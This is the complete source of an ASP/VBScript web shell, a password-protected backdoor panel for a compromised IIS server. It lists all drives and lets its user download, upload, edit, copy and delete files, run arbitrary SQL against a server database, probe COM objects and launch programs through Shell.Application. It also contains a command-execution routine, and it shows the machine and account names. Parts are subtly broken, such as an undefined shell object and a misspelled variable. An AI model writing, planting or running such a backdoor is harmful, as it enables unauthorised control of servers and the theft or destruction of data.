   <%@LANGUAGE=VBScript.Encode  codepage ="936"%>
   <%Server.ScriptTimeOut=6000%>
   <object runat=server id=SSyss scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
   <%on error resume next
   dim Data_xlsf
   Class upload_xlsf
   dim oForm,objFile,Version
   Public function Form(sForm)
   sForm=lcase(sForm)
   if not oForm.exists(sForm) then
   Form=""
   else
   Form=oForm(sForm)
   end if
   end function
   Public function File(strFile)
   strFile=lcase(strFile)
   if not objFile.exists(strFile) then
   set File=new FileInfo
   else
   set File=objFile(strFile)
   end if
   end function
   Private Sub Class_Initialize
   dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
   dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
   dim iFindStart,iFindEnd
   dim iFormStart,iFormEnd,sFormName
   Version="xiaolu"
   set oForm=Server.CreateObject("Scripting.Dictionary")
   set objFile=Server.CreateObject("Scripting.Dictionary")
   if Request.TotalBytes<1 then Exit Sub
   set tStream = Server.CreateObject("adodb.stream")
   set Data_xlsf = Server.CreateObject("adodb.stream")
   Data_xlsf.Type = 1
   Data_xlsf.Mode =3
   Data_xlsf.Open
   Data_xlsf.Write  Request.BinaryRead(Request.TotalBytes)
   Data_xlsf.Position=0
   RequestData =Data_xlsf.Read
   iFormStart = 1
   iFormEnd = LenB(RequestData)
   vbCrlf = chrB(13) & chrB(10)
   sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
   iStart = LenB (sStart)
   iFormStart=iFormStart+iStart+1
   while (iFormStart + 10) < iFormEnd
   iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
   tStream.Type = 1
   tStream.Mode =3
   tStream.Open
   Data_xlsf.Position = iFormStart
   Data_xlsf.CopyTo tStream,iInfoEnd-iFormStart
   tStream.Position = 0
   tStream.Type = 2
   tStream.Charset ="gb2312"
   sInfo = tStream.ReadText
   tStream.Close
   iFormStart = InStrB(iInfoEnd,RequestData,sStart)
   iFindStart = InStr(22,sInfo,"name=""",1)+6
   iFindEnd = InStr(iFindStart,sInfo,"""",1)
   sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
   if InStr (45,sInfo,"filename=""",1) > 0 then
   set theFile=new FileInfo
   iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
   iFindEnd = InStr(iFindStart,sInfo,"""",1)
   sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileName=getFileName(sFileName)
   theFile.FilePath=getFilePath(sFileName)
   iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
   iFindEnd = InStr(iFindStart,sInfo,vbCr)
   theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileStart =iInfoEnd
   theFile.FileSize = iFormStart -iInfoEnd -3
   theFile.FormName=sFormName
   if not objFile.Exists(sFormName) then
   objFile.add sFormName,theFile
   end if
   else
   tStream.Type =1
   tStream.Mode =3
   tStream.Open
   Data_xlsf.Position = iInfoEnd
   Data_xlsf.CopyTo tStream,iFormStart-iInfoEnd-3
   tStream.Position = 0
   tStream.Type = 2
   tStream.Charset ="gb2312"
   sFormValue = tStream.ReadText
   tStream.Close
   if oForm.Exists(sFormName) then
   oForm(sFormName)=oForm(sFormName)&", "&sFormValue
   else
   oForm.Add sFormName,sFormValue
   end if
   end if
   iFormStart=iFormStart+iStart+1
   wend
   RequestData=""
   set tStream =nothing
   End Sub
   Private Sub Class_Terminate
   if Request.TotalBytes>0 then
   oForm.RemoveAll
   objFile.RemoveAll
   set oForm=nothing
   set objFile=nothing
   Data_xlsf.Close
   set Data_xlsf =nothing
   end if
   End Sub
   Private function GetFilePath(FullPath)
   If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
   Else
   GetFilePath = ""
   End If
   End  function
   Private function GetFileName(FullPath)
   If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
   Else
   GetFileName = ""
   End If
   End  function
   End Class
   Class FileInfo
   dim FormName,FileName,FilePath,FileSize,FileType,FileStart
   Private Sub Class_Initialize
   FileName = ""
   FilePath = ""
   FileSize = 0
   FileStart= 0
   FormName = ""
   FileType = ""
   End Sub
   Public function SaveAs(FullPath)
   dim dr,ErrorChar,i
   SaveAs=true
   if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
   set dr=CreateObject("Adodb.Stream")
   dr.Mode=3
   dr.Type=1
   dr.Open
   Data_xlsf.position=FileStart
   Data_xlsf.copyto dr,FileSize
   dr.SaveToFile FullPath,2
   dr.Close
   set dr=nothing
   SaveAs=false
   end function
   End Class
   httpt = Request.ServerVariables("server_name")
   rseb=Request.ServerVariables("SCRIPT_NAME")
   d=request("d")
   if Request.Cookies("passwd")<>"7758" then
   if request.form("passwd")="ÇëÔÚÕâÀïÊäÈëÃÜÂë" then ¡®ÃÜÂëÃÜÂëÃÜÂëÃÜÂëÃÜÂëÃÜÂëÃÜÂëÃÜÂëÃÜÂë
   response.cookies("passwd")="7758"
   response.redirect rseb & "?d=ls.asp"
   else
   %>
   <form method="POST" action="">
   Password£º<input type="passwd" name="passwd" size="20">
   <input type="submit" value="LOGIN">
   </form>
   <%
   end if
   response.end
   end if
   select case d
   case "d.asp"
   call downloadFile(request("path"))
   function downloadFile(strFile)
   strFilename = strFile
   Response.Buffer = True
   Response.Clear%>
   <object runat=server id=s scope=page classid="clsid:00000566-0000-0010-8000-00AA006D2EA4"></object>
   <%s.Open
   s.Type = 1
   if not SSyss.FileExists(strFilename) then
   Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
   Response.End
   end if
   Set f = SSyss.GetFile(strFilename)
   intFilelength = f.size
   s.LoadFromFile(strFilename)
   if err then
   Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
   Response.End
   end if
   Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
   Response.AddHeader "Content-Length", intFilelength
   Response.CharSet = "UTF-8"
   Response.ContentType = "application/octet-stream"
   Response.BinaryWrite s.Read
   Response.Flush
   s.Close
   Set s = Nothing
   response.end
   End Function
   case "ls.asp"
   urlpath=server.urlencode(path)
   dim cpath,lpath
   if Request("path")="" then
   lpath="/"
   else
   lpath=Request("path")&"/"
   end if
   if Request("attrib")="true" then
   cpath=replace(lpath,"/","\")
   attrib="true"
   else
   cpath=Server.MapPath(lpath)
   attrib=""
   end if
   Sub GetFolder()
   dim theFolder,theSubFolders
   if SSyss.FolderExists(cpath)then
   Set theFolder=SSyss.GetFolder(cpath)
   Set theSubFolders=theFolder.SubFolders
   Response.write"<a href='" & rseb & "?d=ls.asp&path="&Request("oldpath")&"&attrib="&attrib&"'>¡ü..</a><br><script language=vbscript>"
   For Each x In theSubFolders
   %>so "<%=lpath%>","<%=x.Name%>","<%=request("path")%>","<%=attrib%>"
   <%Next%>
   </script>
   <%
   end if
   End Sub
   Sub GetFile()
   dim theFiles
   if SSyss.FolderExists(cpath)then
   Set theFolder=SSyss.GetFolder(cpath)
   Set theFiles=theFolder.Files
   Response.write"<table border='0' width='100%' cellpadding='0'><script language=vbscript>"
   For Each x In theFiles
   if Request("attrib")="true" then
   showstring=x.Name
   else
   showstring=x.Name
   end if%>sf "<%=showstring%>","<%=x.size%>","<%=x.type%>","<%=x.Attributes%>","<%=x.DateLastModified%>","<%=lpath%>","<%=x.name%>","<%=attrib%>","<%=x.name%>"
   <%
   Next
   end if
   Response.write"</script></table>"
   End Sub
   %>
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title><%=httpt%></title>
   <style type="text/css">
   <!--
   table{font-size: 9pt }
   a{font-size: 9pt; color: rgb(0,32,64); text-decoration: none }
   a:hover{color: rgb(255,0,0); text-decoration: none }
   a:visited{ color: rgb(128,0,0) }
   td{font-size: 9pt}
   a{color: #000000; text-decoration: none}
   a:hover {text-decoration: underline}
   .tx{height: 16px; width: 30px; border-color: black black #000000; border-top-width: 0px; border-right-width: 0px; border-bottom-width: 1px; border-left-width: 0px; font-size: 9pt; background-color: #eeeeee; color: #0000FF}
   .bt{font-size: 9pt; border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px; height: 16px; width: 80px; background-color: #eeeeee; cursor: hand}
   .tx1{height: 18px; width: 40px; font-size: 9pt; border: 1px solid; border-color: black black #000000; color: #0000FF}
   -->
   </style>
   </head>
   <script language="JavaScript">
   function crf(ls)
   {if (ls==""){alert("name?");}
   else {window.open("<%=rseb%>?d=e.asp&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
   return false;
   }
   function crd(ls)
   {if (ls==""){alert("name?");}
   else {window.open("<%=rseb%>?d=edir.asp&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
   return false;
   }
   </script>
   <script language="vbscript">
   sub sf(showstring,size,type1,Attributes,DateLastModified,lpath,xname,attrib,name)
   document.write "<tr style=""color: #000000; background-color: #DCECFC; text-decoration: blink; border: 1px solid #000080"" onMouseOver=""this.style.backgroundColor = '#C6CDDF'"" onMouseOut=""this.style.backgroundColor='#DCECFC'""><td width='65%'><a href='"& urlpath & lpath & xName &"' target='_blank'><strong>" & showstring & "</strong></a></td><td width='15%' align='right'>" & size & "b</td><td width='20%'><a href='#' title='Type:" & type1 & chr(10) & "Attri:" & Attributes & chr(10) & "Time:" & DateLastModified &"'>Attri</a>|<a href='<%=rseb%>?d=e.asp&path=" & lpath & xName & "&attrib=" & attrib &"' target='_blank' ><font color='#FF8000'></font>E</a>|<a href="&chr(34)&"javascript: rmd1('"& lpath & xName &"')"&chr(34)&"><font color='#FF8000'></font>D</a>|<a href='#' onclick=cfile('" & lpath & Name & "')><font  color='#FF8000'></font>C</a>|<a href='<%=rseb%>?d=d.asp&path=<%=cpath%>\"&xName&"&attrib=" & attrib &"' target='_blank'><font color='#FF8000'></font>DL</a></td></tr>"
   end sub
   sub so(lpath,xName,path,attrib)
   document.write "©¸<a href='<%=rseb%>?d=ls.asp&path="& lpath & xName & "&oldpath=" & path & "&attrib=" & attrib &"'>" & xName &"</a> |<a href="&chr(34)&"javascript: rmd('"& lpath & xName &"')"&chr(34)&">D</a><br>"
   end sub
   sub rmd1(ls)
   if confirm("Really del:"&ls)   then
   window.open("<%=rseb%>?d=e.asp&path=" & ls & "&op=del&attrib=<%=request("attrib")%>")
   end if
   end sub
   sub rmd(ls)
   if confirm("Really del:"&ls)   then
   window.open("<%=rseb%>?d=edir.asp&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
   end if
   end sub
   sub cfile(sfile)
   dfile=InputBox("Copy"&Chr(13)&Chr(10)&"file:"&sfile&Chr(13)&Chr(10)&"Input file name:")
   dfile=trim(dfile)
   attrib="<%=request("attrib")%>"
   if dfile<>"" then
   if InStr(dfile,":") or InStr(dfile,"/")=1 then
   lp=""
   if InStr(dfile,":") and attrib<>"true" then
   alert "Path mode error:"&dfile
   exit sub
   end if
   else
   lp="<%=lpath%>"
   end if
   window.open("<%=rseb%>?d=e.asp&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
   else
   alert"name?"
   end If
   end sub
   </script>
   <body>
   <table border="1" width="755" cellpadding="0" height="81" bordercolorlight="#000000" bordercolordark="#FFFFFF" align="center" cellspacing="0">
   <tr>
   <td width="755" bgcolor="#C8E3FF" colspan="2" height="23" align="center"><%=httpt%></td>
   </tr>
   <tr>
   <td width="755" bgcolor="#DDDDDD" colspan="2">
   <%For Each thing in SSyss.Drives
   Response.write "[<a href='" & rseb & "?d=ls.asp&path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&":</a>]"
   NEXT
   set oSN=Server.CreateObject("WS"+"cri"+"pt.Ne"+"twork")
   %>&nbsp;User:<%= "\\" & oSN.ComputerName & "\" & oSN.UserName %></td>
   </tr>
   <tr>
   <td width="755" bgcolor="#DDDDDD" colspan="2">
   <%if Request("attrib")="true"  then
   response.write "<a href='" & rseb & "?d=ls.asp'>Apath</a>"
   else
   response.write "<a href='" & rseb & "?attrib=true&d=ls.asp'>Rpath</a>"
   end if
   %>  Rpath:<%=cpath%> | CDir:<%=lpath%></td>
   </tr>
   <form name="form1" method="post" action="<%=rseb%>?d=up.asp" target="_blank" enctype="multipart/form-data">
   <tr><td bgcolor="#DDDDDD" colspan="2">
   <input class="tx1" type="text" name="fname" size="20">
   <input class="tx1" type="button" value="Nfile" onclick="crf(form1.fname.value)">
   <input class="tx1" type="button" value="Ndir" onclick="crd(form1.fname.value)">
   <input type="file" name="file1" class="tx1" style="width:150" value="">
   <input type="text" name="filepath" class="tx1" style="width:200" value="<%=cpath%>">
   <input type="hidden" name="act" value="upload">
   <input type="hidden" name="upcount" value="1">
   <input class="tx1" type="submit" value="UP">
   <input class="tx1" type="button" onclick="window.open('<%=rseb%>?d=page.asp','_blank')"  value="PAGE">
   <input class="tx1" type="button" onclick="window.open('<%=rseb%>?d=p.asp','_blank')"  value="NFSO">
   <input class="tx1" type="button" onclick="window.open('<%=rseb%>?d=sql.asp','_blank')"  value="SQL">
   </td>
   </td>
   </tr></form>
   <tr>
   <td width="173" valign="top" bgcolor="#D2E7FC"><%Call GetFolder()%>
   </td>
   <td width="582" valign="top" bgcolor="#DCECFC"><%Call GetFile()%>
   </td>
   </tr>
   </table>
   </body>
   </html>
   <%case "e.asp"%>
   <html>
   <head>
   <meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb_2312-80">
   <title>edit</title>
   <style>
   <!--
   table{font-size: 9pt }
   a{font-size: 9pt; color: rgb(0,32,64); text-decoration: none }
   a:hover{color: rgb(255,0,0); text-decoration: underline }
   a:visited{color: rgb(128,0,0) }
   -->
   </style>
   </head>
   <body bgcolor="#DDDDDD">
   <%if request("op")="del"  then
   if Request("attrib")="true" then
   wfile=Request("path")
   else
   wfile=server.mappath(Request("path"))
   end if
   Set thisfile = SSyss.GetFile(wfile)
   thisfile.Delete True
   Response.write "<script>alert('Del succ!');window.close();</script>"
   else
   if request("op")="copy" then
   if Request("attrib")="true" then
   wfile=Request("path")
   dsfile=Request("dpath")
   else
   wfile=server.mappath(Request("path"))
   dsfile=Server.MapPath(Request("dpath"))
   end if
   Set thisfile = SSyss.GetFile(wfile)
   thisfile.copy dsfile
   %>
   <script language=vbscript>
   msgbox "File:<%=wfile%>" & vbcrlf & "to:<%=dsfile%>" & vbcrlf & "Copy succ!"
   window.close()
   </script>
   <%
   else
   if request.form("text")="" then
   if Request("creat")<>"yes" then
   if Request("attrib")="true" then
   wfile=Request("path")
   else
   wfile=server.mappath(Request("path"))
   end if
   Set thisfile = SSyss.OpenTextFile(wfile, 1, False)
   counter=0
   thisline=Server.HTMLEncode(thisfile.readall)
   thisfile.Close
   set fs=nothing
   end if
   %>
   <form method="POST" action="<%=rseb%>?d=e.asp">
   <input type="hidden" name="attrib" value="<%=Request("attrib")%>">
   <table border="0" width="760" cellpadding="0" align="center">
   <tr>
   <td width="100%">File:<input type="text" name="path" size="45" value="<%=Request("path")%>"> <input type="submit" value="Save" name="B1"><input type="reset" value="Reset" name="B2"></td>
   </tr>
   <tr>
   <td width="100%"><textarea rows="30" name="text" cols="104"><%=thisline%></textarea></td>
   </tr>
   </table>
   </form>
   <%else
   if Request("attrib")="true" then
   wfile=Request("path")
   else
   wfile=server.mappath(Request("path"))
   end if
   Set outfile=SSyss.CreateTextFile(wfile)
   outfile.WriteLine Request("text")
   utfile.close
   set fs=nothing
   Response.write "<script>alert('Edit succ!');window.close();</script>"
   end if
   end if
   end if
   %>
   </body>
   </html>
   <%case "edir.asp"
   if request("op")="del"  then
   if Request("attrib")="true" then
   wdir=Request("path")
   else
   wdir=server.mappath(Request("path"))
   end if
   SSyss.DeleteFolder wdir,True
   Response.write "<script>alert('Del dir:" & replace(wdir,"\","\\") & " Succ!');window.close();</script>"
   else
   if request("op")="creat"  then
   if Request("attrib")="true" then
   wdir=Request("path")
   else
   wdir=server.mappath(Request("path"))
   end if
   SSyss.CreateFolder wdir
   Response.write "<script>alert('Create Dir:" & replace(wdir,"\","\\") & " succ!');window.close();</script>"
   end if
   end if
   case "up.asp"
   set upload=new upload_xlsf
   if upload.form("filepath")="" then
   HtmEnd "Input up path!"
   set upload=nothing
   response.end
   else
   formPath=upload.form("filepath")
   if right(formPath,1)<>"\" then formPath=formPath&"\"
   end if
   for each formName in upload.objFile
   set file=upload.file(formName)
   if file.FileSize>0 then
   file.SaveAs formPath & file.FileName
   response.write file.FilePath&file.FileName&" ("&file.FileSize&") To:<br> "&formPath&File.FileName&" Succ!<br>"
   end if
   set file=nothing
   next
   set upload=nothing
   sub HtmEnd(Msg)
   set upload=nothing
   Response.write "UP Succ!"
   response.end
   end sub
   case "sql.asp"
   If trim(request.form("sqlcmd"))<>""  Then
   password= trim(Request.form("pa"))
   id=trim(Request.form("id"))
   SqlLocalName=trim(Request.form("SqlLocalName"))
   ku=trim(Request.form("ku"))
   session("sqlu")=id
   session("sqlp")=password
   session("sqls")=SqlLocalName
   session("sqlc")=trim(request.form("sqlcmd"))
   session("sqlk")=ku
   if SqlLocalName="" or SqlLocalName="sql server" then SqlLocalName="127.0.0.1"
   set adoConn=Server.CreateObject("ADODB.Connection")
   adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id&";Database="&ku&";Data Source ="&SqlLocalName
   strQuery = session("sqlc")
   set recResult = adoConn.Execute(strQuery)
   if left(strQuery,4)="exec" or left(strQuery,6)="select" then
   If NOT recResult.EOF Then
   for i=0 to recResult.Fields.Count-1
   strResultn=strResultn&"<td>"&recResult.Fields(i).Name&"</td>"
   next
   allre="<table border=1 width=600 cellspacing=0 cellpadding=0 bgcolor=#B8B8B8 style='font-size:9pt'><tr bgcolor=#cccccc height=18>"&strResultn&"</tr><tr bgcolor=#EEEEEE height=18>"
   Do While NOT recResult.EOF
   for i=0 to recResult.Fields.Count-1
   strResult = strResult &"<td>"& outcmd(recResult.Fields(i).value)&"</td>"
   next
   allre=allre&strResult&"</tr><tr bgcolor=#EEEEEE height=18>"
   strResult=""
   recResult.MoveNext
   Loop
   allre=allre&"</tr></table>"
   End if
   end if
   set recResult = Nothing
   End if
   set adoConn = Nothing
   %>
   <form name="form" method=post action="<%=rseb%>?d=sql.asp">
   <table border=0 width=600 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" style='font-size:9pt'>
   <tr bgcolor="#EEEEEE" height=18 class="noborder"><td>
   <input type="text" name="sqlcmd" size=80 value="<%=session("sqlc")%>"><br>
   <input type="text" name="id" size=10 value="<%if session("sqlu")="" then%>Uid<%else%><%Response.Write session("sqlu") end if%>">
   <input type="text" name="pa" size=10 value="<%if session("sqlp")="" then%>Pwd<%else%><%Response.Write session("sqlp") end if%>">
   <input type="text" name="ku" size=12 value="<%if session("sqlk")="" then%>master<%else%><%Response.Write session("sqlk") end if%>">
   <input type="text" name="SqlLocalName" size=30 value="<%if session("sqls")="" then%>sql server<%else%><%Response.Write session("sqls") end if%>">
   <input type="submit" value="Exec">
   </td></tr></table>
   </form>
   <%Response.Write request.form("sqlcmd") & "<br>"
   Response.Write allre
   case "page.asp"
   Response.Buffer = False
   public IsObj,VerObj,TestObj
   dim i
   for i=0 to 25
   IsObj=false
   VerObj=""
   TestObj=""
   set TestObj=server.CreateObject(ObjTotest(i,0))
   If -2147221005 <> Err then
   IsObj = True
   VerObj = TestObj.version
   if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
   end if
   ObjTotest(i,2)=IsObj
   ObjTotest(i,3)=VerObj
   next
   sub ObjTest(strObj)
   on error resume next
   IsObj=false
   VerObj=""
   TestObj=""
   set TestObj=server.CreateObject (strObj)
   If -2147221005 <> Err then
   IsObj = True
   VerObj = TestObj.version
   if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
   end if
   End sub
   %>
   <HTML>
   <HEAD>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <TITLE>hello</TITLE>
   <style>
   <!--
   BODY{FONT-SIZE: 9pt}
   TD{FONT-SIZE: 9pt}
   A{COLOR: #000000;TEXT-DECORATION: none}
   A:hover{COLOR: #3F8805;TEXT-DECORATION: underline}
   .input{BORDER: #111111 1px solid;FONT-SIZE: 9pt;BACKGROUND-color: #F8FFF0}
   .backs{BACKGROUND-COLOR: #3F8805;COLOR: #ffffff;}
   .backq{BACKGROUND-COLOR: #EEFEE0}
   .backc{BACKGROUND-COLOR: #3F8805;BORDER: medium none;COLOR: #ffffff;HEIGHT: 18px;font-size: 9pt}
   .fonts{COLOR: #3F8805}
   -->
   </STYLE>
   </HEAD>
   <BODY>
   <table border=0 width=450 cellspacing=0 cellpadding=0 bgcolor="#3F8805">
   <tr><td>
   <table border=0 width=450 cellspacing=1 cellpadding=0>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;Server</td><td>&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;IP</td><td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;Port</td><td>&nbsp;<%=Request.ServerVariables("SERVER_PORT")%></td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;Time</td><td>&nbsp;<%=now%></td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;IIS</td><td>&nbsp;<%=Request.ServerVariables("SERVER_SOFTWARE")%></td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;Script out time</td><td>&nbsp;<%=Server.ScriptTimeout%>S</td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;Path</td><td>&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;CPU num</td><td>&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> ¸ö</td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;Ver</td><td>&nbsp;<%=ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion %></td>
   </tr>
   <tr bgcolor="#EEFEE0" height=18>
   <td align=left>&nbsp;Os ver</td><td>&nbsp;<%=Request.ServerVariables("OS")%></td>
   </tr>
   </table>
   </td></tr>
   </table>
   <br>
   <%Dim strClass
   strClass = Trim(Request.Form("classname"))
   If strClass<>"" or strClas1<>"" then
   Response.Write "<br>Page result"
   ObjTest(strClass)
   If Not IsObj then
   Response.Write "<br><font color=red>Not support  " & strclass & "<br></font>"
   Else
   if VerObj="" or isnull(VerObj) then
   Verobj1="get ver error"
   Else
   Verobj1="ver:" & VerObj
   End If
   Response.Write "<br><font class=fonts>support " & strclass &" "&verobj1 & "<br></font>"
   End If
   end if%>
   <font class=fonts>Page Obj</font><br>
   <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#3F8805" width="450">
   <FORM action=<%=rseb%>?d=page.asp method=post id=form1 name=form1>
   <tr height="18" class=backq>
   <td align=center height=30><input class=input type=text value="" name="classname" size=40>
   <INPUT type=submit value="Page" class=backc id=submit1 name=submit1>
   <INPUT type=reset value="Reset" class=backc id=reset1 name=reset1>
   </td></tr>
   </FORM>
   </table>
   <%case "p.asp"%>
   <html>
   <title>nfso</title>
   <style>
   <!--
   table{font-size: 9pt }
   BODY{FONT-SIZE: 9pt}
   -->
   </STYLE>
   <body bgcolor="#eeeeee" text="#000000">
   <form action="<%= Request.ServerVariables("URL") %>?d=p.asp" name=qgcmd method="post">
   <%response.write "Path:"&request.servervariables("APPL_PHYSICAL_PATH")%>
   <table border=0 width=490 cellspacing=0 cellpadding=0 class="noborder">
   <tr bgcolor="#EEEEEE" height=18><td align=left>Path: <input type=text name=text value="<%=XA %>"> Browse dir</td></tr>
   <tr bgcolor="#EEEEEE" height=18><td align=left>Copy: <input type=text name=text1 value="<%=XA1 %>"> to <input type=text name=text2 value="<%=XA2 %>"></td></tr>
   <tr bgcolor="#EEEEEE" height=18><td align=left>Move: <input type=text name=text3 value="<%=XA3 %>"> to <input type=text name=text4 value="<%=XA4 %>"></td></tr>
   <tr bgcolor="#EEEEEE" height=18><td align=left>Path: <input type=text name=text5 value="<%=XA5 %>" > Prog: <input type=text name=text6 value="<%=XA6 %>" > No parameters</td></tr>
   <tr bgcolor="#EEEEEE" height=18><td align=left><input type="text" name="ok" size=55> Command</td></tr>
   </table>
   <input type=submit name=sb value=Send class=input>
   </form>
   </body>
   </html>

   ok=trim(Request("ok"))
   if ok<>"" then
   response.write "<script>parent.document.qgcmd.ok.value='"&replace(ok,"\","\\")&"';</script>"
   set re=oS.exec (ok)
   re=re.stdout.readall
   re=outcmd(re)
   response.write re
   end if
   aa="shell"
   bb="application"
   set sl=server.createobject(aa&"."&bb)
   XA = Request.Form("text")
   if (XA <> "")  then
   set fod1=sl.namespace(XA)
   set foditems=fod1.items
   for each co in foditems
   response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
   next
   end if
   XA1 = Request.Form("text1")
   XA2 = Request.Form("text2")
   if XA1<>"" and XA2<>"" then
   set fod1=sl.namespace(XA2)
   for i=len(XA1) to 1 step -1
   if mid(XA1,i,1)="\" then
   path=left(XA1,i-1)
   exit for
   end if
   next
   if len(path)=2 then path=path & "\"
   path2=right(XA1,len(XA1)-i)
   set fod2=sl.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.copyhere foditem
   response.write "command success!"
   end if
   XA3 = Request.Form("text3")
   XA4 = Request.Form("text4")
   if XA3<>"" and XA4<>"" then
   set fod1=sl.namespace(XA4)
   for i=len(XA3) to 1 step -1
   if mid(XA3,i,1)="\" then
   path=left(XA3,i-1)
   exit for
   end if
   next
   if len(path)=2 then path=path & "\"
   path2=right(XA3,len(XA3)-i)
   set fod2=sl.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.movehere foditem
   response.write "command completed success!"
   end if
   XA5 = Request.Form("text5")
   XA6 = Request.Form("text6")
   if XA5<>"" and XA6<>"" then
   sl.namespace(XA5).items.item(XA6).invokeverb
   response.write "command completed success!"
   end if
   end select
   public function encrypt(password)
       dim key(16)
       dim one,two,three,four
       dim i
       dim dstbytes(16)

       bu_String2Bytes password, key
       bu_String2Bytes password, dstbytes

       one= bu_Bytes2Int(key, 0) * 213119 + 2529077
       one = one - Fix(one/ 4294967296) * 4294967296
       two = bu_Bytes2Int(key, 4) * 213247 + 2529089
       two = two - Fix(two/ 4294967296) * 4294967296
       three = bu_Bytes2Int(key, 8) * 213203 + 2529589
       three = three - Fix(three/ 4294967296) * 4294967296
       four = bu_Bytes2Int(key, 12) * 213821 + 2529997
       four = four - Fix(four/ 4294967296) * 4294967296


       call MyuwSplit(one, key(0), key(1), key(2), key(3))
       call MyuwSplit(two, key(4), key(5), key(6), key(7))
       call MyuwSplit(three, key(8), key(9), key(10), key(11))
       call MyuwSplit(Four, key(12), key(13), key(14), key(15))

       dstbytes(0) = dstbytes(0) xor key(0)

       for i=1 to 15
           dstbytes(i) = dstbytes(i) xor dstbytes(i-1) xor key(i and 15)
       next

       for i=0 to 15
           if dstbytes(i) = 0 then
               dstbytes(i) = &H66
           end if
       next

       encrypt = "0x"
       for i=0 to 15
           if dstbytes(i) < &H10 then
               encrypt = encrypt & "0" & Hex(dstbytes(i))
           else
               encrypt = encrypt & Hex(dstbytes(i))
           end if
       next
   end function

   Public Sub MyuwSplit(ByRef w, a, b, C, d)
       d = Fix(w / &H1000000)
       c = Fix((w - d * &H1000000) / &H10000)
       b = Fix((w - d * &H1000000 - c * &H10000) / &H100)
       a = Fix((w - d * &H1000000 - c * &H10000 - b * &H100))
   End Sub

   public Function bu_Bytes2Int(aBytes(), index)
       dim rslt
       rslt = aBytes(index) + aBytes(index+1)*256 + aBytes(index+2)*65536 + aBytes(index+3)*16777216

       bu_Bytes2Int = rslt
   End Function

   Public Function bu_String2Bytes(str, aBytes())
       nBytes = Len(str)
       For i = 0 To nBytes - 1
           aBytes(i) = Asc(Mid(str, i + 1, 1))
       Next

       bu_String2Bytes = nBytes

   End Function
   function outcmd(Re)
   Re = Replace(Re," ","&nbsp;")
   Re = Replace(Re,"<","&lt;")
   Re = Replace(Re,">","&gt;")
   Re = Replace(Re,chr(13),"<br>")
   outcmd=re
   end function
   %>
